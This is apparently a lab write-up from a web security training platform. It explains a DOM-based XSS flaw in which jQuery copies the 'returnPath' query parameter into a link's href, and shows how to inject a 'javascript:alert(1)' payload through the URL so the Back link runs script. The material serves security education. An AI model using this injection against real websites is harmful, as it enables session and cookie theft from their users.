# DOM XSS in jQuery anchor href atribute sink using locationSearch source

> ****\*\*****\*\*\*\*****\*\*****Instructions****\*\*****\*\*\*\*****\*\*****
>
> This lab contains a [DOM-based cross-site scripting](<../../Cross-site%20Scripting%20(XSS)/Sub_Pages/DOM-based%20XSS.md>) vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
>
> To solve this lab, make the "back" link alert `document.cookie`.

Access the **\*\*\*\***\*\***\*\*\*\***Home Page**\*\*\*\***\*\***\*\*\*\***, there is an \***\*\*\*\*\*\*\***anchor\***\*\*\*\*\*\*\*** tag `a` named ****\*\*****\*\*\*\*****\*\*****Submit feedback****\*\*****\*\*\*\*****\*\***** with the `href` attribute:

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled.png)

```html
<a href="/feedback?returnPath=/">Submit feedback</a>
```

Click the anchor ******\*\*******\*\*******\*\*******Submit feedback******\*\*******\*\*******\*\******* and you will be routed to the feedback page

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled%201.png)

Now, press `Ctrl + U` to view the Page’s Source and you would notice 2 points:

- The `href` attribute has been changed to:
  ```html
  <a href="/feedback?returnPath=/feedback">Submit feedback</a>
  <p>|</p>
  ```
- And scroll down below, there is a `script` using \***\*\*\*\*\*\*\***jQuery\***\*\*\*\*\*\*\*** library within the `attr()` function:
  ```jsx
  $(function () {
    $("#backLink").attr(
      "href",
      new URLSearchParams(window.location.search).get("returnPath")
    );
  });
  ```

The script would take the value from `?returnPath=` from the URL and then parse that value into the `href` attribute of the `#backLink` element which is the `< Back` button below

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled%202.png)

```jsx
<a id="backLink" href="/feedback">
  Back
</a>
```

Click on the URL bar → press `END` to move the pointer to the end of the line → Remove the `/feedback` value and modify it with the malicious script:

```jsx
https://0aba006803a4c6ba81ab116a001400be.web-security-academy.net/feedback?returnPath=javascript:alert(1)
```

Press `Enter` to submit the change → Right-click to inspect the element of anchor ******\*\*******\*\*******\*\*******Submit Feedback******\*\*******\*\*******\*\******* → Verify that the `href` attribute has been changed with the `alert()` function:

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled%203.png)

```jsx
<a href="/feedback?returnPath=javascript:alert(1)">Submit feedback</a>
```

Do the same with the `< Back` button

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled%204.png)

```jsx
<a id="backLink" href="javascript:alert(1)">
  Back
</a>
```

Click the `< Back` button and it will display an alert pop-up window

![Untitled](DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20locationSearch%20source%20images/Untitled%205.png)
